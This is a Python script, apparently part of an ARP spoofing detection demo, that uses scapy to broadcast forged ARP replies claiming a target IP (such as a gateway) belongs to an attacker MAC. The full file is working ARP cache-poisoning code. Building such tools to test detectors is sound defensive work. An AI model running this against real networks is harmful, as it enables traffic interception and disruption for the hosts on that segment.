"""simulate_attack.py — Craft and send spoofed ARP replies to demo ARP spoofing detection.

Usage::
    sudo python3 simulate_attack.py --iface eth0 --target-ip 192.168.1.1
    sudo python3 simulate_attack.py --iface eth0 --target-ip 192.168.1.1 --count 5

This script sends ARP op=2 replies claiming target-ip is reachable at the attacker's MAC.
If the detector has already seen target-ip mapped to a different MAC (via baseline or traffic),
it will raise an alert.  Run main.py in one terminal and this script in a second terminal.

Requires:
  - Root/sudo (sendp uses raw sockets)
  - scapy installed (pip install scapy)
"""
import argparse
import sys
import time

try:
    from scapy.all import ARP, Ether, get_if_hwaddr, sendp
except ImportError:
    print("[ERROR] scapy is not installed.  Run: pip install scapy", file=sys.stderr)
    sys.exit(1)


_ATTACKER_MAC = "de:ad:be:ef:ca:fe"


def _check_root() -> None:
    import os
    euid = getattr(os, "geteuid", None)
    if euid is not None and euid() != 0:
        print("[ERROR] simulate_attack.py requires root/sudo for sendp().", file=sys.stderr)
        sys.exit(1)


def _parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        description="Send spoofed ARP replies to demonstrate ARP spoofing detection."
    )
    p.add_argument(
        "--iface",
        default="eth0",
        help="Network interface to send packets on (default: eth0)",
    )
    p.add_argument(
        "--target-ip",
        required=True,
        help="IP address to claim (e.g. the gateway IP 192.168.1.1)",
    )
    p.add_argument(
        "--attacker-mac",
        default=_ATTACKER_MAC,
        help=f"Source MAC to use in spoofed packets (default: {_ATTACKER_MAC})",
    )
    p.add_argument(
        "--count",
        type=int,
        default=10,
        help="Number of spoofed packets to send (default: 10)",
    )
    p.add_argument(
        "--interval",
        type=float,
        default=1.0,
        help="Seconds between packets (default: 1.0)",
    )
    p.add_argument(
        "--verbose",
        action="store_true",
        help="Print each packet as it is sent",
    )
    return p.parse_args()


def craft_spoof_packet(target_ip: str, attacker_mac: str) -> "Ether":
    """Return a single spoofed ARP reply Ethernet frame.

    The packet claims target_ip is reachable at attacker_mac.
    Broadcast destination so all hosts on the segment update their cache.
    """
    return (
        Ether(dst="ff:ff:ff:ff:ff:ff", src=attacker_mac)
        / ARP(
            op=2,
            psrc=target_ip,
            hwsrc=attacker_mac,
            pdst="255.255.255.255",
            hwdst="ff:ff:ff:ff:ff:ff",
        )
    )


def run_attack(
    iface: str,
    target_ip: str,
    attacker_mac: str = _ATTACKER_MAC,
    count: int = 10,
    interval: float = 1.0,
    verbose: bool = False,
) -> int:
    """Send count spoofed ARP packets on iface.  Returns number of packets sent."""
    pkt = craft_spoof_packet(target_ip, attacker_mac)
    print(f"[*] Sending {count} spoofed ARP replies on {iface}")
    print(f"    Claiming: {target_ip} is at {attacker_mac}")
    print(f"    Interval: {interval}s between packets")
    print(f"    Press Ctrl+C to stop early.")

    sent = 0
    try:
        for i in range(count):
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
            if verbose:
                print(f"  [{i + 1}/{count}] Sent: {target_ip} -> {attacker_mac}")
            if i < count - 1:
                time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n[*] Stopped after {sent} packets.")

    print(f"[*] Done. Sent {sent} spoofed ARP packet(s).")
    return sent


def main() -> None:
    _check_root()
    args = _parse_args()
    run_attack(
        iface=args.iface,
        target_ip=args.target_ip,
        attacker_mac=args.attacker_mac,
        count=args.count,
        interval=args.interval,
        verbose=args.verbose,
    )


if __name__ == "__main__":
    main()
